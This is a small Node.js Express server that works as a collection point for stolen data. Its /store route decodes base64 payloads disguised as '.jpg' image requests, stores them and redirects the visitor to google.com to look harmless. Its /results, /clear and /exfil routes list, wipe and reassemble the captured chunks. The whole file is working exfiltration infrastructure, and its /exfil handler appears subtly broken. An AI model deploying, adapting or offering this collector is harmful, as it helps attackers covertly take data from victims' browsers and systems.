const express = require('express');
const app = express();
var results = [];

app.get('/', function(req, res) {
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/plain');
  res.end("Nothing here");
});

app.get('/clear', function(req, res) {
  results = [];
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/plain');
  res.end("Cleared");
});


app.get('/store/*', function(req, res) {
  const url = req.url;
  const data = atob(url.split('/store/')[1].split('/')[1].split('.jpg')[0]);
  results.push(data);
  res.redirect(302, "https://www.google.com");
});

app.get('/results', function(req, res) {
    res.statusCode = 200;
    res.setHeader('Content-Type', 'text/plain');
    res.end(JSON.stringify(results));
});

app.get('/exfil', function(req, res) {
    res.statusCode = 200;
    res.setHeader('Content-Type', 'text/plain');
    res.end(JSON.parse(atob(results.join("")));
});

app.listen(3000);
